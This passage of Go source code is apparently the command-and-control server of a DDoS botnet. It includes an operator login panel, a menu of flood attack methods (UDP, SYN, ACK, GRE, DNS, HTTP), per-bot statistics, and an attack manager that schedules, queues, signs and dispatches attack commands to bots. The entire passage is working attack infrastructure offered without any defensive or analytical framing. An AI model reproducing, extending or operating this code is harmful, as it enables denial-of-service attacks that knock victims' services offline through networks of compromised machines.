	defer file.Close()
	conn.Write([]byte("\033[2J\033[H"))
	border := "\033[38;5;237sm+\033[38;5;240sm-\033[38;5;243sm-\033[38;5;246sm-\033[38;5;249sm-\033[0m\n\r"
	conn.Write([]byte(border))
	title := fmt.Sprintf("\033[38;5;240sm|\033[38;5;183sm    AUDIT LOG (LAST %d ENTRIES)    \033[0m\n\r", maxLines)
	conn.Write([]byte(title))
	conn.Write([]byte(border))
	lines := make([]string, 0, maxLines)
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if len(lines) >= maxLines {
			lines = lines[1:]
		}
		lines = append(lines, line)
	}
	if err := scanner.Err(); err != nil {
		return
	}
	for _, line := range lines {
		if len(line) > 120 {
			line = line[:117] + "..."
		}
		fmt.Fprintf(conn, "%s\n\r", line)
	}
	conn.Write([]byte(border))
}

func displayServerStatus(conn net.Conn) {
	conn.Write([]byte("\033[2J\033[H"))
	stats := getAggregatedStats()
	fmt.Fprintf(conn, "Server Status:\n")
	fmt.Fprintf(conn, "Uptime: %s (System: %.2f hours)\n",
		time.Since(serverStartTime).Round(time.Second),
		getUptime()/3600)
	fmt.Fprintf(conn, "System Load: %.2f\n", getSystemLoad())
	fmt.Fprintf(conn, "System RAM: %.2fGB\n", getSystemRAM())
	fmt.Fprintf(conn, "CPU Cores: %d\n", getCPUCount())
	fmt.Fprintf(conn, "Bots: %d (Healthy: %d, Unhealthy: %d)\n", getBotCount(), stats.HealthyBots, stats.UnhealthyBots)
	fmt.Fprintf(conn, "Active Attacks: %d/%d\n", attackManagerInstance.countAttacks(), attackManagerInstance.getMaxAttacks())
	fmt.Fprintf(conn, "Active Sessions: %d\n", len(clients))
	fmt.Fprintf(conn, "Avg Latency: %v\n", stats.AvgLatency.Round(time.Millisecond))
	fmt.Fprintf(conn, "Avg Throughput: %.2f/s\n", stats.AvgThroughput)
	fmt.Fprintf(conn, "Total RAM: %.1fGB\n", stats.TotalRAM)
	fmt.Fprintf(conn, "Total Cores: %d\n", stats.TotalCores)
}

func displayQuickHelp(conn net.Conn) {
	conn.Write([]byte("\033[2J\033[H"))
	fmt.Fprintf(conn, "Available Attack Methods:\n")
	fmt.Fprintf(conn, "!udpflood - Standard UDP flood attack\n")
	fmt.Fprintf(conn, "!udpsmart - UDP flood with smart payload\n")
	fmt.Fprintf(conn, "!tcpflood - TCP flood attack\n")
	fmt.Fprintf(conn, "!synflood - SYN flood attack\n")
	fmt.Fprintf(conn, "!ackflood - ACK flood attack\n")
	fmt.Fprintf(conn, "!greflood - GRE flood attack\n")
	fmt.Fprintf(conn, "!dns - DNS flood attack\n")
	fmt.Fprintf(conn, "!http - HTTP flood attack\n")
	fmt.Fprintf(conn, "\nType 'help' for more commands\n")
}

func displayBotStats(conn net.Conn) {
	botStatsLock.Lock()
	defer botStatsLock.Unlock()
	if len(botPerformance) == 0 {
		return
	}
	stats := make([]struct {
		ip    string
		stats BotStats
	}, 0, len(botPerformance))
	for ip, stat := range botPerformance {
		stats = append(stats, struct {
			ip    string
			stats BotStats
		}{ip, stat})
	}
	sort.Slice(stats, func(i, j int) bool {
		return stats[i].ip < stats[j].ip
	})
	pageSize := 10
	currentPage := 0
	totalPages := (len(stats) + pageSize - 1) / pageSize
	for {
		conn.Write([]byte("\033[2J\033[H"))
		fmt.Fprintf(conn, "Bot Performance Stats (Page %d/%d) - Total Bots: %d\n\n",
			currentPage+1, totalPages, len(stats))
		fmt.Fprintf(conn, "%-20s %-10s %-10s %-6s %-15s %-10s\n",
			"IP", "Latency", "Throughput", "RAM", "Arch", "Last Seen")
		start := currentPage * pageSize
		end := start + pageSize
		if end > len(stats) {
			end = len(stats)
		}
		for _, stat := range stats[start:end] {
			fmt.Fprintf(conn, "%-20s %-10v %-10.2f %-6.1f %-15s %-10s\n",
				truncateString(stat.ip, 20),
				stat.stats.Latency.Round(time.Millisecond),
				stat.stats.Throughput,
				stat.stats.RAM,
				truncateString(stat.stats.Architecture, 15),
				stat.stats.LastSeen.Format("15:04:05"))
		}
		fmt.Fprintf(conn, "\nNavigation: n-next, p-previous, q-quit\n> ")
		reader := bufio.NewReader(conn)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)
		switch input {
		case "n":
			if currentPage < totalPages-1 {
				currentPage++
			}
		case "p":
			if currentPage > 0 {
				currentPage--
			}
		case "q":
			return
		}
	}
}

func truncateString(str string, length int) string {
	if len(str) > length {
		return str[:length-3] + "..."
	}
	return str
}

func sanitizeInput(input string) string {
	var result strings.Builder
	for _, r := range input {
		switch {
		case r == '\n', r == '\r', r == '\t':
			continue
		case unicode.IsGraphic(r) && !unicode.IsControl(r):
			result.WriteRune(r)
		}
	}
	return strings.TrimSpace(result.String())
}

func validateIP(ip string) bool {
	parsed := net.ParseIP(ip)
	if parsed == nil {
		return false
	}
	for _, block := range reservedIPBlocks {
		_, network, _ := net.ParseCIDR(block)
		if network.Contains(parsed) {
			return false
		}
	}
	badIPs := []string{"127.0.0.1", "0.0.0.0", "255.255.255.255"}
	for _, bad := range badIPs {
		if ip == bad {
			return false
		}
	}
	return true
}

func validatePort(portStr string) bool {
	port, err := strconv.Atoi(portStr)
	if err != nil {
		return false
	}
	return port > 0 && port <= 65535
}

func validateDuration(duration string) bool {
	dur, _ := strconv.Atoi(duration)
	return dur > 0 && dur <= cfg.MaxAttackDuration
}

func validatePassword(password string) error {
	if len(password) < 12 {
		return fmt.Errorf("password must be at least 12 characters")
	}

	var hasUpper, hasLower, hasDigit, hasSpecial bool
	for _, c := range password {
		switch {
		case unicode.IsUpper(c):
			hasUpper = true
		case unicode.IsLower(c):
			hasLower = true
		case unicode.IsDigit(c):
			hasDigit = true
		case unicode.IsPunct(c) || unicode.IsSymbol(c):
			hasSpecial = true
		}
	}

	if !hasUpper || !hasLower || !hasDigit || !hasSpecial {
		return fmt.Errorf("password must contain uppercase, lowercase, digit and special characters")
	}

	commonPasswords := []string{"password", "123456", "qwerty", "letmein"}
	lowerPass := strings.ToLower(password)
	for _, common := range commonPasswords {
		if strings.Contains(lowerPass, common) {
			return fmt.Errorf("password is too common or weak")
		}
	}

	return nil
}

func getFromConn(conn net.Conn) (string, error) {
	reader := bufio.NewReader(io.LimitReader(conn, int64(cfg.MaxReadSize)))
	readString, _ := reader.ReadString('\n')
	readString = strings.TrimSuffix(readString, "\n")
	readString = strings.TrimSuffix(readString, "\r")
	return sanitizeInput(readString), nil
}

func authUser(conn net.Conn) (bool, *client) {
	conn.Write([]byte("\033[2J\033[H\033[2J\033[3J"))
	remoteAddr := conn.RemoteAddr().String()
	if !loginRateLimiter.Allow() {
		conn.Close()
		return false, nil
	}
	for attempt := 0; attempt < 3; attempt++ {
		conn.Write([]byte(fmt.Sprintf("\033[38;5;254smAttempt %d/3\033\r\n[0m ", attempt+1)))
		conn.Write([]byte("\033\r\n[38;5;251sm• Username\033[38;5;62m:  \033[0m"))
		username, _ := getFromConn(conn)
		username = sanitizeInput(username)
		conn.Write([]byte("\033[38;5;251sm• Password\033[38;5;62m: \033[0m"))
		conn.Write([]byte("\033[8m"))
		password, _ := getFromConn(conn)
		conn.Write([]byte("\033[0m\033[?25h"))
		if exists, user := AuthUser(username, password); exists {
			resetTokens.RLock()
			if t, ok := resetTokens.m[username]; ok {
				if time.Now().Before(t.expires) && !t.used {
					conn.Write([]byte("\nYou have a pending password reset. Enter your reset token or press enter to continue:\n"))
					conn.Write([]byte("\033[38;5;251sm• Reset Token\033[38;5;62m: \033[0m"))
					token, _ := getFromConn(conn)
					if checkResetToken(username, token) {
						conn.Write([]byte("\nPlease enter your new password:\n"))
						conn.Write([]byte("\033[38;5;251sm• New Password\033[38;5;62m: \033[0m"))
						conn.Write([]byte("\033[8m"))
						newPassword, _ := getFromConn(conn)
						conn.Write([]byte("\033[0m"))
						hashedPassword, _ := bcrypt.GenerateFromPassword([]byte(newPassword), bcrypt.DefaultCost)
						users := []User{}
						if data, err := os.ReadFile(cfg.UsersFile); err == nil {
							json.Unmarshal(data, &users)
							for i := range users {
								if users[i].Username == username {
									users[i].PasswordHash = string(hashedPassword)
									break
								}
							}
							saveUsers(users)
						}
						resetTokens.Lock()
						tokenEntry := resetTokens.m[username]
						tokenEntry.used = true
						resetTokens.m[username] = tokenEntry
						resetTokens.Unlock()
					}
				}
			}
			resetTokens.RUnlock()
			userSessionLock.Lock()
			if userSessions[username] >= cfg.MaxSessionsPerUser {
				userSessionLock.Unlock()
				conn.Close()
				return false, nil
			}
			userSessions[username]++
			userSessionLock.Unlock()
			sessionID := randomString(32)
			ctx, cancel := context.WithCancel(context.Background())
			loggedClient := &client{
				conn:       conn,
				user:       *user,
				sessionID:  sessionID,
				remoteAddr: remoteAddr,
				ctx:        ctx,
				cancel:     cancel,
			}
			sessionStore.Set(sessionID, &session{
				client:     loggedClient,
				lastActive: time.Now(),
				loginIP:    remoteAddr,
			})
			conn.Write([]byte("\033[2J\033[H\033[2J\033[3J"))
			clients = append(clients, loggedClient)
			return true, loggedClient
		}
		conn.Write([]byte("\033[2J\033[H\033[2J\033[3J"))
		if attempt < 2 {
			conn.Write([]byte("Invalid credentials. Please try again.\n"))
		}
	}
	conn.Write([]byte("\033[2J\033[H\033[2J\033[3J"))
	conn.Close()
	return false, nil
}

func checkResetToken(username, token string) bool {
	resetTokens.RLock()
	defer resetTokens.RUnlock()
	if t, ok := resetTokens.m[username]; ok {
		if t.token == token && time.Now().Before(t.expires) && !t.used {
			return true
		}
	}
	return false
}

func signCommand(cmd string) string {
	mac := hmac.New(sha256.New, signingKey)
	mac.Write([]byte(cmd))
	return base64.StdEncoding.EncodeToString(mac.Sum(nil))
}

func (am *attackManager) checkScheduledAttacks() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		am.mutex.Lock()
		now := time.Now()
		var remainingScheduled []Attack

		for _, attack := range am.scheduledAttacks {
			if now.After(attack.Start) || now.Equal(attack.Start) {
				if len(am.attacks) < am.getMaxAttacks() {
					am.attacks[attack.Conn] = attack
					launchAttack(attack.Conn, attack)
					logOutput("ATTACK", fmt.Sprintf("Started scheduled attack: %s on %s:%s",
						attack.Method, attack.Target, attack.Port))
				} else {
					am.attackQueue = append(am.attackQueue, attack)
				}
			} else {
				remainingScheduled = append(remainingScheduled, attack)
			}
		}

		am.scheduledAttacks = remainingScheduled
		am.mutex.Unlock()
	}
}

func (am *attackManager) removeAttack(conn net.Conn) {
	am.mutex.Lock()
	defer am.mutex.Unlock()
	delete(am.attacks, conn)
	am.processQueue()
}

func (am *attackManager) processQueue() {
	if len(am.attacks) < am.getMaxAttacks() && len(am.attackQueue) > 0 {
		sort.Slice(am.attackQueue, func(i, j int) bool {
			return am.attackQueue[i].Priority > am.attackQueue[j].Priority
		})
		nextAttack := am.attackQueue[0]
		am.attackQueue = am.attackQueue[1:]
		launchAttack(nextAttack.Conn, nextAttack)
	}
}

func launchAttack(conn net.Conn, attack Attack) {
	attackManagerInstance.attacks[conn] = attack
	cmd := fmt.Sprintf("%s %s %s %s", attack.Method, attack.Target, attack.Port,
		strconv.Itoa(int(attack.Duration.Seconds())))
	sig := signCommand(cmd)

	logOutput("ATTACK", fmt.Sprintf("Launching %s attack on %s:%s for %s (User: %s)",
		attack.Method, attack.Target, attack.Port, attack.Duration, attack.User))

	sendToBots(fmt.Sprintf("%s %s", cmd, sig), attack.User)

	go func() {
		time.Sleep(attack.Duration)
		attackManagerInstance.removeAttack(conn)
		logOutput("ATTACK", fmt.Sprintf("Completed %s attack on %s:%s",
			attack.Method, attack.Target, attack.Port))
	}()
}

func (am *attackManager) getAttacks() []Attack {
	am.mutex.RLock()
	defer am.mutex.RUnlock()
	attacks := make([]Attack, 0, len(am.attacks))
	for _, a := range am.attacks {
		attacks = append(attacks, a)
	}
	return attacks
}

func (am *attackManager) countAttacks() int {
	am.mutex.RLock()
	defer am.mutex.RUnlock()
	return len(am.attacks)
}

func (am *attackManager) getMaxAttacks() int {
	return cfg.MaxQueuedAttacks
}

func (am *attackManager) getUserQueuedAttacks(username string) []Attack {
	am.mutex.RLock()
	defer am.mutex.RUnlock()
	var userAttacks []Attack
	for _, a := range am.attackQueue {
		if a.User == username {
			userAttacks = append(userAttacks, a)
		}
	}
	return userAttacks
}

func (am *attackManager) cancelQueuedAttack(username string, index int) bool {
	am.mutex.Lock()
	defer am.mutex.Unlock()
	found := 0
	for idx, a := range am.attackQueue {
		if a.User == username {
			if found == index {
				am.attackQueue = append(am.attackQueue[:idx], am.attackQueue[idx+1:]...)
				return true
			}
			found++
		}
	}
	return false
}

func AuthUser(username, password string) (bool, *User) {
	users := []User{}
	usersFile, err := os.ReadFile(cfg.UsersFile)
	if err != nil {
		return false, nil
	}
	json.Unmarshal(usersFile, &users)
	for idx, user := range users {
		if user.Username == username {
			if time.Now().Before(user.LockedUntil) {
				return false, nil
			}
			if err := bcrypt.CompareHashAndPassword([]byte(user.PasswordHash), []byte(password)); err == nil {
				users[idx].FailedAttempts = 0
				users[idx].LastLogin = time.Now()
				users[idx].LastActivity = time.Now()
				saveUsers(users)
				return true, &users[idx]
			}
			users[idx].FailedAttempts++
			if users[idx].FailedAttempts >= 5 {
				users[idx].LockedUntil = time.Now().Add(30 * time.Minute)
			}
			saveUsers(users)
			return false, nil
		}
	}
	return false, nil
}

func (s *SessionStore) Get(id string) (*session, bool) {
	val, ok := s.store.Load(id)
	if !ok {
		return nil, false
	}
	return val.(*session), true
}

func (s *SessionStore) Set(id string, sess *session) {
	s.store.Store(id, sess)
}

func (s *SessionStore) Delete(id string) {
	s.store.Delete(id)
}

func (s *SessionStore) Range(f func(key, value interface{}) bool) {
	s.store.Range(f)
}

type rateLimiter struct {
	limiter      *rate.Limiter
	lastSeen     time.Time
	attacksToday int
	lastReset    time.Time
	dailyLimit   int
}

type session struct {
	client     *client
	lastActive time.Time
	loginIP    string
	expires    time.Time
}

func deleteUser(username string) error {
	users := getUsers()
	var updatedUsers []User

	for _, user := range users {
		if user.Username != username {
			updatedUsers = append(updatedUsers, user)
		}
	}

	if len(updatedUsers) == len(users) {
		return fmt.Errorf("user not found")
	}

	return saveUsers(updatedUsers)
}
